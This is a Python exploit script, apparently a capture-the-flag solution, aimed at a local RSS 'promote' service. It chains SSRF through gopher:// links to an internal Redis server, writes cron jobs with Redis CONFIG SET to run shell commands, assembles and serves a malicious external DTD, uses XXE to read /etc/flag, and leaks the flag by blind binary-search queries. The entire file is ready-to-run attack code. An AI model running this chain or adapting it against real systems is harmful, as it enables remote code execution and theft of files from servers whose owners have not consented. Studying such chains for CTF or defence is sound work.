import json
import requests
import string
from time import sleep
from uuid import uuid4
from urllib.parse import quote

HOST = "http://localhost:80"
VAR_REDIS_FLAG = 'flag'

def generate_link(s):
    return f"gopher://cache:6379/_{s}"

def generate_rce(script, dir, fname):
    redis = [
        "FLUSHALL",
        f"SET rce \"{script}\"",
        f"CONFIG SET dir {dir}",
        f"CONFIG SET dbfilename {fname}",
        "BGREWRITEAOF"
    ]
    redis_cmd = quote("\r\n".join(redis) + "\r\n")
    return generate_link(redis_cmd)

def generate_cron(script):
    cron = "\\n\\n*/1 * * * * {}\\n\\n".format(script)
    return generate_rce(cron, "/var/spool/cron/crontabs", "redis")

def send_request(mode, l, v = True):
    with open(f"{mode}.xml") as f:
        xml = f.read().replace("{{ link }}", l)
    data = {
        "link": str(uuid4()),
        "rss": xml
    }
    resp = requests.post(HOST + "/promote", json=data).content
    if v: print(resp.decode())
    return resp

def upload_external_dtd():
    def escape_shell(s):
        ESCAPE = "&;`|*?~<>^()[]{}$\\,'\""
        ret = ""
        for c in s:
            if c == "#":
                ret += "\\\\x" + hex(ord("#"))[2:]
                continue
            if c in ESCAPE:
                ret += "\\"
            ret += c
        return ret
    def tohex(s):
        ret = ""
        for c in s:
            ret += "\\x" + hex(ord(c))[2:]
        return ret

    dtd = f"""<!ENTITY % file SYSTEM "file:///etc/flag">
    <!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'gopher://cache:6379/_SET&#x25;20{VAR_REDIS_FLAG}&#x25;20%file;'>">
    %eval;
    %send;
    """.replace("\n", "").replace("  ", "")

    send_request("ges", generate_cron("rm /home/redis/exploit.dtd"))
    sleep(61)

    block = 30
    for i in range(0, len(dtd), block):
        cmd = tohex(escape_shell(dtd[i:i+block]))
        create_dtd = f"echo -ne {cmd} >> /home/redis/exploit.dtd"
        print(create_dtd)
        link = generate_cron(create_dtd)
        send_request("ges", link)
        sleep(61)
    
    send_request("ges", generate_cron(""))

def serve_external_dtd():
    serve_dtd = 'cd /home/redis && python3 -m http.server'
    link = generate_cron(serve_dtd)
    send_request("ges", link)

def send_flag_to_redis():
    link = "http://cache:8000/exploit.dtd"
    send_request("pes", link)

def guess_flag():
    def generate_guess(var, pos, guess):
        cmd = f"EVAL \"return redis.call('GETRANGE', '{var}', {pos}, {pos}) >= '{guess}' and ' ' or '&lol;'\" 0"
        cmd = quote(cmd)
        return generate_link(cmd)
    flag = ""
    hrf = sorted(list(string.ascii_letters + string.digits + "_-"))
    for i in range(100):
        l = 0
        r = len(hrf) - 1
        tmp = ""
        while l <= r:
            mid = (l +  r) // 2
            c = hrf[mid]
            link = generate_guess(VAR_REDIS_FLAG, i, c)
            resp = json.loads(send_request("ges", link, False))["status"]
            # print(resp, c)
            if resp == "ok":
                tmp = c 
                l = mid + 1
            else: r = mid - 1
        flag += tmp
        print(flag)
    print(flag)

#
# MAIN PROGRAM
#

print("Uploading external dtd...")
upload_external_dtd()

print("Serve external dtd...")
serve_external_dtd()
sleep(65)
print("Available in http://cache:8000/exploit.dtd")

print("Send flag to redis...")
send_flag_to_redis()

print("Get flag...")
guess_flag()